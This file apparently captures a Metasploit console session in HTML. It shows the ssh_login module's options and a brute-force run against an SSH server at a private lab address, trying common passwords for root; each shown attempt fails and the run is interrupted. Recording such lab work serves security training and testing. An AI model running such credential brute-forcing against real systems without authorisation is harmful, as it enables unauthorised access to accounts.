@@ -1,0 +1,55 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Metasploit: ssh_login</title>
+</head><body><span style="font-family: monospace">msf6 auxiliary(scanner/ssh/ssh_login) &gt; options<br/>
+<br/>
+Module options (auxiliary/scanner/ssh/ssh_login):<br/>
+<br/>
+&nbsp; &nbsp;Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Current Setting &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Required &nbsp;Description<br/>
+&nbsp; &nbsp;---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;--------------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -------- &nbsp;-----------<br/>
+&nbsp; &nbsp;ANONYMOUS_LOGIN &nbsp; false &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; yes &nbsp; &nbsp; &nbsp; Attempt to login with a blank username and password<br/>
+&nbsp; &nbsp;BLANK_PASSWORDS &nbsp; false &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; no &nbsp; &nbsp; &nbsp; &nbsp;Try blank passwords for all users<br/>
+&nbsp; &nbsp;BRUTEFORCE_SPEED &nbsp;5 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; yes &nbsp; &nbsp; &nbsp; How fast to bruteforce, from 0 to 5<br/>
+&nbsp; &nbsp;DB_ALL_CREDS &nbsp; &nbsp; &nbsp;false &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; no &nbsp; &nbsp; &nbsp; &nbsp;Try each user/password couple stored in the current database<br/>
+&nbsp; &nbsp;DB_ALL_PASS &nbsp; &nbsp; &nbsp; false &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; no &nbsp; &nbsp; &nbsp; &nbsp;Add all passwords in the current database to the list<br/>
+&nbsp; &nbsp;DB_ALL_USERS &nbsp; &nbsp; &nbsp;false &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; no &nbsp; &nbsp; &nbsp; &nbsp;Add all users in the current database to the list<br/>
+&nbsp; &nbsp;DB_SKIP_EXISTING &nbsp;none &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;no &nbsp; &nbsp; &nbsp; &nbsp;Skip existing credentials stored in the current database (Accepted<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: none, user, user&amp;realm)<br/>
+&nbsp; &nbsp;PASSWORD &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;no &nbsp; &nbsp; &nbsp; &nbsp;A specific password to authenticate with<br/>
+&nbsp; &nbsp;PASS_FILE &nbsp; &nbsp; &nbsp; &nbsp; /usr/share/wordlists/metasploit/unix &nbsp;no &nbsp; &nbsp; &nbsp; &nbsp;File containing passwords, one per line<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_passwords.txt<br/>
+&nbsp; &nbsp;RHOSTS &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;192.168.248.129 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; yes &nbsp; &nbsp; &nbsp; The target host(s), see https://docs.metasploit.com/docs/using-met<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;asploit/basics/using-metasploit.html<br/>
+&nbsp; &nbsp;RPORT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 22 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;yes &nbsp; &nbsp; &nbsp; The target port<br/>
+&nbsp; &nbsp;STOP_ON_SUCCESS &nbsp; false &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; yes &nbsp; &nbsp; &nbsp; Stop guessing when a credential works for a host<br/>
+&nbsp; &nbsp;THREADS &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 10 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;yes &nbsp; &nbsp; &nbsp; The number of concurrent threads (max one per host)<br/>
+&nbsp; &nbsp;USERNAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;root &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;no &nbsp; &nbsp; &nbsp; &nbsp;A specific username to authenticate as<br/>
+&nbsp; &nbsp;USERPASS_FILE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; no &nbsp; &nbsp; &nbsp; &nbsp;File containing users and passwords separated by space, one pair p<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;er line<br/>
+&nbsp; &nbsp;USER_AS_PASS &nbsp; &nbsp; &nbsp;false &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; no &nbsp; &nbsp; &nbsp; &nbsp;Try the username as the password for all users<br/>
+&nbsp; &nbsp;USER_FILE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; no &nbsp; &nbsp; &nbsp; &nbsp;File containing usernames, one per line<br/>
+&nbsp; &nbsp;VERBOSE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; true &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;yes &nbsp; &nbsp; &nbsp; Whether to print output for all attempts<br/>
+<br/>
+<br/>
+View the full module info with the info, or info -d command.<br/>
+<br/>
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; run<br/>
+<br/>
+[*] 192.168.248.129:22 - Starting bruteforce<br/>
+[-] 192.168.248.129:22 - Failed: 'root:admin'<br/>
+[!] No active DB -- Credential data will not be saved!<br/>
+[-] 192.168.248.129:22 - Failed: 'root:123456'<br/>
+[-] 192.168.248.129:22 - Failed: 'root:12345'<br/>
+[-] 192.168.248.129:22 - Failed: 'root:123456789'<br/>
+[-] 192.168.248.129:22 - Failed: 'root:password'<br/>
+[-] 192.168.248.129:22 - Failed: 'root:iloveyou'<br/>
+[-] 192.168.248.129:22 - Failed: 'root:princess'<br/>
+[-] 192.168.248.129:22 - Failed: 'root:1234567'<br/>
+[-] 192.168.248.129:22 - Failed: 'root:12345678'<br/>
+[-] 192.168.248.129:22 - Failed: 'root:abc123'<br/>
+[-] 192.168.248.129:22 - Failed: 'root:nicole'<br/>
+[-] 192.168.248.129:22 - Failed: 'root:daniel'<br/>
+^C[*] Caught interrupt from the console...<br/>
+[*] Auxiliary module execution completed</span></body></html>
